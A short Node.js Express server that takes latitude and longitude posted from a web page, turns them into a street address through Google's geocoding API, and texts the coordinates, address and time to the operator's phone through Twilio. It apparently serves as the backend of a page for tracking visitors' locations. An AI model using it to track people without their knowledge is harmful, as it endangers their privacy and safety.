import express from "express";
import bodyParser from "body-parser";
import twilio from "twilio";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(bodyParser.json());

// Twilio client
const client = twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH);

// Reverse geocode function
async function getAddress(lat, lon) {
    const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${process.env.GOOGLE_API}`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.results.length > 0) {
        return data.results[0].formatted_address;
    }
    return "Address not found";
}

// Main route your index.html calls
app.post("/api/track", async (req, res) => {
    const { lat, lon } = req.body;

    try {
        const address = await getAddress(lat, lon);

        const message = `
📍 Location tracked!
Lat: ${lat}
Lon: ${lon}
🏠 Address: ${address}
⏰ Time: ${new Date().toLocaleString()}
        `;

        await client.messages.create({
            body: message,
            from: process.env.TWILIO_PHONE,
            to: process.env.MY_PHONE
        });

        res.json({ success: true });
    } catch (err) {
        console.error("Error sending SMS:", err);
        res.json({ success: false });
    }
});

app.listen(3000, () => console.log("Server running on port 3000"));
